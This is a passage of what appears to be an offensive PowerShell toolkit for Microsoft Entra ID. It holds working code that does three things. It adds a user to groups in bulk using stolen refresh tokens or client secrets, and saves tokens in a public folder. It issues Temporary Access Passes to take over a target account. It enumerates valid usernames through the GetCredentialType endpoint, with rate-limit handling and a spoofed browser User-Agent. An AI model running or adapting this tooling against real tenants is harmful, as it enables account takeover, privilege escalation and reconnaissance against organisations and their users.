				"scope" = "https://graph.microsoft.com/.default"
				"grant_type" = "refresh_token"
				"refresh_token" = $RefreshToken
			}
			return (Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers).access_token
		}


		function Get-Token-WithClientSecret {
		param(
			[string]$ClientID,
			[string]$ClientSecret,
            [string]$TenantID

		)
			$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
			$body = @{
				"client_id"= $ClientId
				"client_secret" = $ClientSecret
				"scope" = "https://graph.microsoft.com/.default"
				"grant_type" = "client_credentials"
			}
			return (Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers).access_token
		}

		$authMethod = ""
		if ($RefreshToken) {
			$authMethod = "refresh"
			$GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken -TenantID $TenantID
		} elseif ($ClientId -and $ClientSecret) {
			$authMethod = "client"
			$GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -ClientSecret $ClientSecret -TenantID $TenantID
		} elseif ($DeviceCodeFlow) {
			$authMethod = "refresh"
			if (Test-Path "C:\Users\Public\RefreshToken.txt"){
				Remove-Item -Path "C:\Users\Public\RefreshToken.txt" -Force}
				$RefreshToken = Get-DeviceCodeToken
				Add-Content -Path "C:\Users\Public\RefreshToken.txt" -Value $RefreshToken
				Write-Host "[^.^] refresh token writen in C:\Users\Public\RefreshToken.txt " -ForegroundColor DarkYellow
				$GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken -TenantID $TenantID
			}
		if (-not $GraphAccessToken) { return }

	
	    function Decode-JWT {
            param([Parameter(Mandatory = $true)][string]$Token)
            $tokenParts = $Token.Split(".")
            $payload = $tokenParts[1].Replace('-', '+').Replace('_', '/')
            switch ($payload.Length % 4) { 2 { $payload += "==" }; 3 { $payload += "=" } }
            $bytes = [System.Convert]::FromBase64String($payload)
            return ([System.Text.Encoding]::UTF8.GetString($bytes) | ConvertFrom-Json)
	    }
	
	
		if($UserID){
			$MemberId = $UserID
		}
		else {
			$DecodedToken = Decode-JWT -Token $GraphAccessToken
			$MemberId = $DecodedToken.oid
		}
	
        Write-Host "[*] MemberId extracted: $MemberId" -ForegroundColor Cyan

        $GroupIds = if (Test-Path $GroupIdsInput) {
            Get-Content -Path $GroupIdsInput | Where-Object { $_.Trim() -ne "" }
        } else {
            @($GroupIdsInput)
        }

        if ($Action -eq "add" -and (Test-Path $SuccessLogFile)) { Remove-Item $SuccessLogFile -Force }

        $StartTime = Get-Date

        foreach ($GroupId in $GroupIds) {

            if ((Get-Date) -gt $StartTime.AddMinutes(7)) {
                Write-Host "[*] Refreshing Access Token..." -ForegroundColor Yellow
                $Global:GraphAccessToken = Get-GraphAccessToken -RefreshToken $RefreshToken
                $StartTime = Get-Date
            }
            $Headers = @{
                'Authorization' = "Bearer $GraphAccessToken"
                'Content-Type' = 'application/json'
                'User-Agent' = "$UserAgent"
            }
            $RetryCount = 0
            $MaxRetries = 5
            $Success = $false

            do {
                try {
                    if ($Action -eq "add") {
                        $Url = "https://graph.microsoft.com/v1.0/groups/$GroupId/members/`$ref"
                        $Body = @{ '@odata.id' = "https://graph.microsoft.com/v1.0/directoryObjects/$MemberId" } | ConvertTo-Json
                        Invoke-RestMethod -Method POST -Uri $Url -Headers $Headers -Body $Body -ContentType "application/json"
                        Write-Host "[+] Added $MemberId to $GroupId" -ForegroundColor Green
                        
                        Add-Content -Path $SuccessLogFile -Value $GroupId
                        $Success = $true
                    } elseif ($Action -eq "delete") {
                        $Url = "https://graph.microsoft.com/v1.0/groups/$GroupId/members/$MemberId/`$ref"
                        Invoke-RestMethod -Method DELETE -Uri $Url -Headers $Headers
                        Write-Host "[+] Removed $MemberId from $GroupId" -ForegroundColor Green
                        Add-Content -Path $SuccessRenoveLogFile -Value $GroupId
                        $Success = $true
                    }
                } catch {
                    $Response = $_.Exception.Response
                    $StatusCode = 0
                    $ErrorMessage = "Unknown Error"

                    if ($Response) {
                        $StatusCode = $Response.StatusCode.value__
                        try {
                            $Stream = $Response.GetResponseStream()
                            $Reader = New-Object System.IO.StreamReader($Stream)
                            $RawBody = $Reader.ReadToEnd()
                            $JsonBody = $RawBody | ConvertFrom-Json
                            $ErrorMessage = $JsonBody.error.message
                        } catch {
                            $ErrorMessage = "Failed to parse error response."
                        }
                    }

                    if ($StatusCode -eq 429) {
                        $retryAfter = 7
                        if ($Response.Headers["Retry-After"]) {
                            $retryAfter = [int]$Response.Headers["Retry-After"]
                        }
                        Write-Host "[!] 429 Rate Limit - Sleeping $retryAfter seconds..." -ForegroundColor Yellow
                        Start-Sleep -Seconds $retryAfter
                        $RetryCount++
                    }
                    elseif ($StatusCode -eq 400 -and $Action -eq "add" -and $ErrorMessage -match "already exist") {
                        Write-Host "[=] Member already exists in ${GroupId}." -ForegroundColor Yellow
                        $Success = $true
                    }
                    elseif ($StatusCode -eq 400 -and $Action -eq "delete") {
                        Write-Host "[-] Error during DELETE from ${GroupId}: $ErrorMessage (HTTP $StatusCode)" -ForegroundColor Red
                        $Success = $true
                    }
                    else {
                        Write-Host "[-] Unexpected error during $Action for ${GroupId}: $ErrorMessage (HTTP $StatusCode)" -ForegroundColor Red
                        $Success = $true
                    }
                }
            } while (-not $Success -and $RetryCount -lt $MaxRetries)
            Start-Sleep -Milliseconds 300
        }
}




<################################################################################################################################################>
<################################################################################################################################################>

function Invoke-TAPChanger {



    param(
        [string]$UseTargetID,
        [string]$AccessToken,
        [switch]$Add,
        [switch]$Delete,
        [int]$LifetimeMinutes = 60,
        [bool]$IsUsableOnce = $false,
        [datetime]$StartDateTime
    )


        function Help {
			Write-Host "Invoke-TAPChanger" -ForegroundColor DarkYellow
            Write-Host "[!] You need a privileged account for this action" -ForegroundColor DarkYellow
			Write-Host "    Usage: Invoke-TAPChanger -AccessToken 'eyJ0eXAiOiJKV1QiLCJub25j.....' -UseTargetID '47d6850f-d3b2...' -Add | -Delete " -ForegroundColor DarkCyan
		}

            if (-not $AccessToken -and -not $UseTargetID -and -not $Add -and -not $Delete) {
                Write-Host "[!] Select only one action" -ForegroundColor DarkRed
		        Write-Host " "
                Help
                return
            }

            if ($Add -and $Delete ) {
                Write-Host "[!] Select only one action" -ForegroundColor DarkRed
		        Write-Host " "
                Help
                return
            }

        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        $headers = @{ 'User-Agent' = $UserAgent }

        function New-TemporaryAccessPass {
            param(
                [string]$UserId,
                [string]$Token,
                [int]$Minutes,
                [bool]$UsableOnce,
                [datetime]$Start
            )

            $url = "https://graph.microsoft.com/v1.0/users/$UserId/authentication/temporaryAccessPassMethods"
            $body = @{
                lifetimeInMinutes = $Minutes
                isUsableOnce      = $UsableOnce
            }

            if ($Start) {
                $body.startDateTime = $Start.ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
            }

            $headers = @{
                Authorization = "Bearer $Token"
                "Content-Type" = "application/json"
                "User-Agent"    = "$UserAgent"
            }

            try {
                $response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body ($body | ConvertTo-Json -Depth 10)
                Write-Host "[+] TAP Created Successfully" -ForegroundColor Green
                Write-Host "    TemporaryAccessPass : $($response.temporaryAccessPass)"
                Write-Host "    StartDateTime       : $($response.startDateTime)"
            } catch {
                Write-Error "[-] Failed to create TAP: $_"
            }
        }


        function Remove-TemporaryAccessPass {
            param(
                [string]$UserId,
                [string]$Token
            )

            $baseUrl = "https://graph.microsoft.com/v1.0/users/$UserId/authentication/temporaryAccessPassMethods"
            $headers = @{
                Authorization = "Bearer $Token"
                "Content-Type" = "application/json"
                "User-Agent"    = "$UserAgent"
            }   

            try {
                $methods = Invoke-RestMethod -Uri $baseUrl -Method Get -Headers $headers
                foreach ($method in $methods.value) {
                    $deleteUrl = "$baseUrl/$($method.id)"
                    Invoke-RestMethod -Uri $deleteUrl -Method Delete -Headers $headers
                    Write-Host "[+] TAP Deleted: $($method.id)" -ForegroundColor Yellow
                }
            } catch {
                Write-Error "[-] Failed to delete TAP(s): $_"
            }
        }

        if ($Add) {
            if ($PSBoundParameters.ContainsKey('StartDateTime')) {
			    New-TemporaryAccessPass -UserId $UseTargetID -Token $AccessToken -Minutes $LifetimeMinutes -UsableOnce $IsUsableOnce -Start $StartDateTime
		    } else {
			    New-TemporaryAccessPass -UserId $UseTargetID -Token $AccessToken -Minutes $LifetimeMinutes -UsableOnce $IsUsableOnce
		    }

        }

        if ($Delete) {
            Remove-TemporaryAccessPass -UserId $UseTargetID -Token $AccessToken
        }
}

<######################################################################################################################>
<######################################################################################################################>

function Invoke-ValidUPN {


    param (
        [string]$Username,
        [string]$DomainName,
        [string]$FirstName,
        [string]$LastName,
        [string]$NamesFile,
        [string]$OutputFilePath,
        [switch]$StopOnFirstMatch,
        [string]$ConvertName,
        [ValidateSet("First", "Last", "FirstL", "LastF", "Last.First", "First.Last", 
                 "FirstLast", "LastFirst", "FirstInitialLast", "LastInitialFirst", 
                 "InitialFirstLast", "InitialLastFirst", "FirstTwoLast", "LastTwoFirst", 
                 "FirstThreeLast", "LastThreeFirst","FLast")]
        [string]$Style,
	[string]$Delay
    )



		  function help {
				Write-Host "Invoke-ValidUPN" -ForegroundColor DarkYellow
				Write-Host "  Invoke-ValidUPN -FirstName Shaked -LastName Wiessman -DomainName ShkudW.com" -ForegroundColor DarkCyan
				Write-Host "  Invoke-ValidUPN -NamesFile names.txt -DomainName ShkudW.com -StopOnFirstMatch" -ForegroundColor DarkCyan
				Write-Host "  Invoke-ValidUPN -Username  < usernames.txt | username >  -DomainName ShkudW.com -OutputFilePath report.html" -ForegroundColor DarkCyan
				Write-Host "  Invoke-ValidUPN -ConvertName < names.txt | 'firstname lastname' > -Style First.Last" -ForegroundColor DarkCyan

			}

			if (-not $Username -and -not $DomainName -and -not $FirstName -and -not $LastName -and -not $NamesFile -and -not $OutputFilePath -and -not $StopOnFirstMatch -and -not $ConvertNameFile -and -not $style) {
				help
				return
			}


		function Generate-Username($firstName, $lastName, $style) {
			switch ($style) {
				"First" 	      { return ($firstName) }
				"Last" 		      { return ($lastName) }
				"FirstL"              { return ($firstName + $lastName.Substring(0, 1)).ToLower() }
				"LastF"               { return ($lastName + $firstName.Substring(0, 1)).ToLower() }
   				"FLast"               { return ($firstName.Substring(0, 1)).ToLower() + $lastName }
				"First.Last"          { return ($firstName + "." + $lastName).ToLower() }
				"Last.First"          { return ($lastName + "." + $firstName).ToLower() }
				"FirstLast"           { return ($firstName + $lastName).ToLower() }
				"LastFirst"           { return ($lastName + $firstName).ToLower() }
				"FirstInitialLast"    { return ($firstName + $lastName.Substring(0, 1)).ToLower() }
				"LastInitialFirst"    { return ($lastName + $firstName.Substring(0, 1)).ToLower() }
				"InitialFirstLast"    { return ($firstName.Substring(0, 1) + $lastName).ToLower() }
				"InitialLastFirst"    { return ($lastName.Substring(0, 1) + $firstName).ToLower() }
				"FirstTwoLast"        { return ($firstName + $lastName.Substring(0, 2)).ToLower() }
				"LastTwoFirst"        { return ($lastName + $firstName.Substring(0, 2)).ToLower() }
				"FirstThreeLast"      { return ($firstName + $lastName.Substring(0, 3)).ToLower() }
				"LastThreeFirst"      { return ($lastName + $firstName.Substring(0, 3)).ToLower() }
				default               { return "" }
			}
		}


		if ($ConvertName -and $Style -and -not $DomainName) {
		    $names = @()
		
		    try {
		        if (Test-Path $ConvertName) {
		            $names = Get-Content -Path $ConvertName
		        } else {
		            throw "Not a file"
		        }
		    } catch {
		        Write-Host "Ok it is not a file :)"
		        $names = @($ConvertName)
		    }
		
		    foreach ($name in $names) {
		        $splitName = $name -split '\s+'
		        if ($splitName.Length -ne 2) {
		            Write-Host "Invalid name format: $name" -ForegroundColor DarkCyan
		            continue
		        }
		
		        $firstName = $splitName[0]
		        $lastName = $splitName[1]
		        $username = Generate-Username -firstName $firstName -lastName $lastName -style $Style
		        Write-Output $username
		    }
		}

		 if ($ConvertNameFile -and -not $style) {

			Write-Host " Please use the '-Style' flag: " -ForegroundColor Yellow
			Write-Host " " -ForegroundColor DarkCyan
			Write-Host " FirstL, LastF, Last.First, First.Last, FirstLast, LastFirst, FirstInitialLast, LastInitialFirst,"  -ForegroundColor Yellow
			Write-Host "LastInitialFirst, InitialFirstLast, InitialLastFirst, FirstTwoLast, LastTwoFirst, FirstThreeLast,"	-ForegroundColor Yellow
			Write-Host " ------------------------------------------------------------------------------------------------ " -ForegroundColor Yellow
			return
		}


		 if ($style -and -not $ConvertNameFile) {

			Write-Host "Must to use -ConvetNameFile." -ForegroundColor Yellow
			Write-Host " --------------------------" -ForegroundColor Yellow
			return
		}


 
		if ($FirstName -and $LastName -and $UsernameFile -and $NamesFile -and -not $DomainName) {
			Write-Host "Error: The -DomainName flag is required." -ForegroundColor DarkCyan
			return
		}


    function Check-Tenant {
        param (
            [string]$domain
        )

        $openIdConfigUrl = "https://login.microsoftonline.com/$domain/v2.0/.well-known/openid-configuration"

        try {
            $response = Invoke-RestMethod -Uri $openIdConfigUrl -Method Get -ContentType "application/json"
            if ($response.issuer) {
                $tenantId = $response.issuer -replace "https://login.microsoftonline.com/([^/]+)/.*", '$1'
                return $tenantId
            } else {
                return $null
            }
        }
        catch {
            $errorResponse = $_.Exception.Response.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($errorResponse)
            $responseBody = $reader.ReadToEnd() | ConvertFrom-Json

            if ($responseBody.error -eq "invalid_tenant") {
                return "invalid_tenant"
            } else {
                return "error"
            }
        }
    }

    $tenantId = Check-Tenant -domain $DomainName
    if ($tenantId -eq "invalid_tenant") {
        Write-Host "Error: The domain '$DomainName' does not have a valid Tenant ID." -ForegroundColor DarkCyan
        return
    } elseif ($tenantId -eq "error") {
        Write-Host "Error: An unexpected error occurred while checking the domain '$DomainName'." -ForegroundColor DarkCyan
        return
    } else {
        Write-Host "=================================================================================" -ForegroundColor DarkCyan
        Write-Host "Tenant ID for '$DomainName' was found:  $tenantId" -ForegroundColor Green
        Write-Host "=================================================================================" -ForegroundColor DarkCyan
    }


    function Get-UsernameCombinations {
        param (
            [string]$FirstName,
            [string]$LastName
        )

        return @(
            "$FirstName"
            "$LastName"
	    "$firstName.Substring(0, 1))$lastName"
            "$FirstName$LastName"
            "$FirstName.$LastName"
            "$LastName$FirstName"
            "$LastName.$FirstName"
            "$FirstName$($LastName.Substring(0,1))"
            "$LastName$($FirstName.Substring(0,1))"
            "$($FirstName.Substring(0,1))$LastName"
            "$($LastName.Substring(0,1))$FirstName"
            "$FirstName$($LastName.Substring(0,2))"
            "$LastName$($FirstName.Substring(0,2))"
            "$($FirstName.Substring(0,2))$LastName"
            "$($LastName.Substring(0,2))$FirstName"
            "$FirstName$($LastName.Substring(0,3))"
            "$LastName$($FirstName.Substring(0,3))"
            "$($FirstName.Substring(0,3))$LastName"
            "$($LastName.Substring(0,3))$FirstName"
        )
    }

    $validUsers = @()

    # Checking -FirstName and -LastName combination
    if ($FirstName -and $LastName) {
        $UserNameCombos = Get-UsernameCombinations -FirstName $FirstName -LastName $LastName
        
        foreach ($UserName in $UserNameCombos) {
            $fullUserName = "${UserName}@${DomainName}"

            try {
                $getCredentialTypeUrl = "https://login.microsoftonline.com/common/GetCredentialType"
                $body = @{
                    Username = $fullUserName
                } | ConvertTo-Json

                $response = Invoke-RestMethod -Uri $getCredentialTypeUrl -Method Post -Body $body -ContentType "application/json"

                if ($response.IfExistsResult -eq 0) {
                    Write-Host "The user ${fullUserName} exists in Entra ID." -ForegroundColor Green
                    $validUsers += $fullUserName
                    if ($StopOnFirstMatch) {
                        break
                    }
                } else {
                    Write-Host "The user ${fullUserName} does not exist in Entra ID." -ForegroundColor Red
                }
            } catch {
                Write-Host "An error occurred while checking ${fullUserName}: $_" -ForegroundColor Red
            }
        }
    }


    elseif ($NamesFile) {
        $names = Get-Content -Path $NamesFile
        foreach ($name in $names) {
            $split = $name -split "\s+"
            if ($split.Length -ge 2) {
                $FirstName = $split[0]
                $LastName = $split[1]
                $UserNameCombos = Get-UsernameCombinations -FirstName $FirstName -LastName $LastName
                
                foreach ($UserName in $UserNameCombos) {
                    $fullUserName = "${UserName}@${DomainName}"




					try {
						$getCredentialTypeUrl = "https://login.microsoftonline.com/common/GetCredentialType"
						$body = @{ Username = $fullUserName } | ConvertTo-Json

						$response = Invoke-RestMethod -Uri $getCredentialTypeUrl -Method Post -Body $body -ContentType "application/json"

						if ($response.IfExistsResult -eq 0) {
							Write-Host "The user ${fullUserName} exists in Entra ID." -ForegroundColor Green
							$validUsers += $fullUserName
							if ($StopOnFirstMatch) { break }
						} else {
							Write-Host "The user ${fullUserName} does not exist in Entra ID." -ForegroundColor Red
						}
					}
					catch {
						if ($_.Exception.Response -and $_.Exception.Response.StatusCode -eq 429) {
							Write-Warning "Rate limit hit (429) while checking ${fullUserName}. Backing off..."
							
							$retryAfter = $_.Exception.Response.Headers["Retry-After"]
							if ($retryAfter) {
								$waitTime = [int]$retryAfter
							} else {
								$waitTime = 30  # fallback wait time
							}

							Write-Warning "Waiting $waitTime seconds before retrying..."
							Start-Sleep -Seconds $waitTime

							# Retry once after sleep
							try {
								$response = Invoke-RestMethod -Uri $getCredentialTypeUrl -Method Post -Body $body -ContentType "application/json"

								if ($response.IfExistsResult -eq 0) {
									Write-Host "The user ${fullUserName} exists in Entra ID." -ForegroundColor Green
									$validUsers += $fullUserName
									if ($StopOnFirstMatch) { break }
								} else {
									Write-Host "The user ${fullUserName} does not exist in Entra ID." -ForegroundColor Red
								}
							}
							catch {
								Write-Host "Retry failed for ${fullUserName}: $_" -ForegroundColor Red
							}
						}
						else {
							Write-Host "An error occurred while checking ${fullUserName}: $_" -ForegroundColor Red
						}
					}

					if ($StopOnFirstMatch -and $validUsers) {
						continue
					}
				}
        }
		}
	}

    # Checking file with -UsernameFile
		elseif ($Username) {
			$usernames = @()

			try {
				if (Test-Path $Username) {
					$usernames = Get-Content -Path $Username
				} else {
					throw "Not a file"
				}
			} catch {
				Write-Host "Ok it is not a file :)"
				$usernames = @($Username)
			}

			foreach ($username in $usernames) {
				$fullUserName = "${username}@${DomainName}"

				try {
					$getCredentialTypeUrl = "https://login.microsoftonline.com/common/GetCredentialType"
					$body = @{
						Username = $fullUserName
					} | ConvertTo-Json

					$response = Invoke-RestMethod -Uri $getCredentialTypeUrl -Method Post -Body $body -ContentType "application/json"

					if ($response.IfExistsResult -eq 0) {
						Write-Host "The user ${fullUserName} exists in Entra ID." -ForegroundColor Green
						$validUsers += $fullUserName
					} else {
						Write-Host "The user ${fullUserName} does not exist in Entra ID." -ForegroundColor Red
					}
				} catch {
					Write-Host "An error occurred while checking ${fullUserName}: $_" -ForegroundColor Red
				}

				# Apply delay between API requests
				Start-Sleep -Seconds $Delay
			}
		}
    # Save results to HTML
    if ($OutputFilePath -and $validUsers) {
        $html = @"
<!DOCTYPE html>
<html>
<head>
    <title>Entra-Collection - Invoke-ValidUPN</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; margin: 20px; background-color: #121212; color: #e0e0e0; }
        .container { max-width: 800px; margin: auto; background-color: #1e1e1e; padding: 20px; border-radius: 8px; box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.5); }
        h1 { text-align: center; color: #00adb5; font-size: 2.5em; margin-bottom: 0; }
        h2 { text-align: center; color: #c0c0c0; font-size: 1.2em; margin-top: 5px; }
        .copyright { text-align: center; color: #555; margin-bottom: 20px; font-size: 0.9em; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 10px; border: 1px solid #333; text-align: left; }
        th { background-color: #00adb5; color: #121212; }
        tr:nth-child(even) { background-color: #2c2c2c; }
        tr:nth-child(odd) { background-color: #1e1e1e; }
        button { display: block; margin: 20px auto; padding: 10px 20px; font-size: 16px; cursor: pointer; background-color: #00adb5; color: #121212; border: none; border-radius: 5px; transition: background-color 0.3s ease; }
        button:hover { background-color: #007b9e; }
    </style>
    <script>
        function downloadTXT() {
            var validUsers = [
"@

        foreach ($user in $validUsers) {
            $html += "'$user'," + "`n"
        }

        $html = $html.TrimEnd(",`n")
        $html += @"
            ];
            var text = validUsers.join('\n');
            var blob = new Blob([text], { type: 'text/plain' });
            var anchor = document.createElement('a');
            anchor.download = 'ValidUsers.txt';
            anchor.href = window.URL.createObjectURL(blob);
            anchor.target ='_blank';
            anchor.style.display = 'none'; // just to be safe!
            document.body.appendChild(anchor);
            anchor.click();
            document.body.removeChild(anchor);
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>EntraMail</h1>
        <h2>Valid Users in EntraID</h2>
        <div class="copyright">© By ShkudW</div>
        <button onclick="downloadTXT()">Download as TXT File</button>
        <table>
            <tr><th>Username</th></tr>
"@

        foreach ($user in $validUsers) {
            $html += "<tr><td>$user</td></tr>`n"
        }

        $html += @"
        </table>
    </div>
</body>
</html>
"@

        $html | Out-File -FilePath $OutputFilePath -Encoding UTF8

        Write-Host "The list of valid users has been saved to $OutputFilePath." -ForegroundColor DarkCyan
    }
}
